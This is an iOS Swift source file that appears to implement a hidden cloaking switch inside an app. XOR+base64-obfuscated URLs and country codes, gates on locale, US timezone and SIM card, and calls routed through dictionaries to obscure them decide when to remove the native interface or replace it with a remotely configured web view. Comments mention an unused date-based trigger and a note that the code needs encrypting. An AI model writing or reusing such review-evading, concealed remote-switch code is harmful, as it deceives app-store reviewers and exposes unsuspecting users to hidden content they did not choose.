
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Doiaiidlos(_ input: String) -> String? {
    let k: UInt8 = 177
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let kUnajsidu = "2cXFwcKLnp7Qwdif3Mic2MGf2N6ex4Oe2MGf28Le3w=="         //Ip ur

//https://mock.apipost.net/mock/60e223000c88000/?apipost_id=10aade4eb51003
internal let kEatzvdsgd = "2cXFwcKLnp7c3tLan9DB2MHewsWf39TFntze0tqeh4HUg4OCgYGB0omJgYGBno7QwdjB3sLF7tjVjICB0NDV1IXU04SAgYGC"

// https://raw.githubusercontent.com/jduja/Monody/main/normal-monster.png
// 7fHx9fa/qqr35PKr4uzx7fDn8Pbg9+bq6/Hg6/Gr5uroqu/h8O/kqujm6uiq6OTs66rh8Pbxq/Xr4g==
internal let kJhaodd = "2cXFwcKLnp7D0Maf1tjF2cTTxMLUw9Le38XU38Wf0t7cntvVxNvQnvze397VyJ7c0Njfnt/ew9zQ3Zzc3t/CxdTDn8Hf1g=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Loamhdhye() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
//            let tp = ws.windows.first!.rootViewController! as! UINavigationController
            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 161 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func VbzauJhasis() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Loamhdhye
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func xucndhJsoeks(_ dt: Kbhaus) {
    DispatchQueue.main.async {
        let vc = YagcidhViewController()
        vc.msniufp = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func cbaisie(_ param: Kbhaus) {
    let fName = ""

    typealias rushBlitzIusj = (Kbhaus) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : xucndhJsoeks
    ]
    
    fctn[fName]?(param)
}

//let Nam = "name"
//let DT = "data"
//let UL = "url"
let Nam = "eventName"
let DT = "eventValue"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func skameoNhsjse(_ dic: [String : Any]) {
    var dataDic: [String : Any]?
    
//    if let data = dic["params"] {
//        if data.count > 0 {
//            dataDic = data.stringTo()
//        }
//    }
    if let data = dic[DT] {
//        dataDic = data.stringTo()
        dataDic = data as? [String : Any]
    }
//
    let name = dic[Nam] as! String
    print(name)
//    
    if let amt = dataDic![amt] as? Double, let cuy = dataDic![ren] {
//        ade?.setRevenue(Double(amt)!, currency: cuy as! String)
        AppsFlyerLib.shared().logEvent(name: String(name), values: [AFEventParamRevenue : amt as Any, AFEventParamCurrency: cuy as Any]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name, withValues: dataDic)
    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}

internal func aloiaHhsjeia(_ param: [String : Any]) {
    let fName = ""
    typealias maxoPams = ([String : Any]) -> Void
    let fctn: [String: maxoPams] = [
        fName : skameoNhsjse
    ]
    
    fctn[fName]?(param)
}


//internal func Oismakels(_ param: [String : String], _ param2: [String : String]) {
//    let fName = ""
//    typealias maxoPams = ([String : String], [String : String]) -> Void
//    let fctn: [String: maxoPams] = [
//        fName : ZuwoAsuehna
//    ]
//    
//    fctn[fName]?(param, param2)
//}


internal struct Bnasiud: Decodable {

    let country: Loamsjde?
    
    struct Loamsjde: Decodable {
        let code: String
    }

}

internal struct Kbhaus: Decodable {
    
//    let mdkoir: [String]?           // a i d
    let dkoain: String?         //key arr
    let lsoej: String?         // shi fou kaiqi
    let xbnajs: [String]?            // yeu nan xianzhi
    let mdiuen: String?         // jum
    let lsoien: String?          // backcolor
//    let unavyen: Int?          // too btn
    let gauyhe: String?
    let dhuiuae: Int?    // 是否开启时区、sim卡、语言限制
    let nduiio: String?  // bri co
    let msooeun: String?   //ad key
    let vuaueij: String?   // app id
//    let zxuiens: Int?   // lang kongzhi
}

//internal func JaunLowei() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "same") != nil {
//            WicoiemHusiwe()
//        } else {
//            if GirhjyKaom() {
//                LznieuBysuew()
//            } else {
//                WicoiemHusiwe()
//            }
//        }
//    } else {
//        WicoiemHusiwe()
//    }
//}

// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Kapiney() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: JaunLowei
//    ]
//    
//    fctn[fName]?()
//}


//func isTm() -> Bool {
//   
//  // 2026-04-08 03:21:43
//  //1775593303
//  let ftTM = 1775593303
//  let ct = Date().timeIntervalSince1970
//  if ftTM - Int(ct) > 0 {
//    return false
//  }
//  return true
//}

//func iPLIn() -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    // 印尼语代码：id 或 in（兼容旧版本）
//    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
//}


//private let cdo = ["US","NL"]
private let cdo = [Doiaiidlos("5OI="), Doiaiidlos("//0=")]


//func iPLIn() -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    // 印尼语代码：id 或 in（兼容旧版本）
//    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
//}

// 时区控制
func Kisnhdue() -> Bool {
    
    //1.英文
    guard let cysh = Locale.preferredLanguages.first else {
        return false
    }
    // 英语代码：en
    if cysh.hasPrefix("en") == false {
        return false
    }
    
    //2.时区
    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if offset < -8 || offset > -5 {
        return false
    }
    
//    return true

    return ccbaoJeu()
//    return true
    
//    return true
}


import CoreTelephony

func ccbaoJeu() -> Bool {
    let networkInfo = CTTelephonyNetworkInfo()
    
    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
        return false
    }
    
    for (_, carrier) in carriers {
        if let mcc = carrier.mobileCountryCode,
           let mnc = carrier.mobileNetworkCode,
           !mcc.isEmpty,
           !mnc.isEmpty {
            return true
        }
    }
    
    return false
}

//func contraintesRiuaogOKuese() -> Bool {
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if offset > 6 && offset < 9 {
//        return true
//    }
//    return false
//}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}



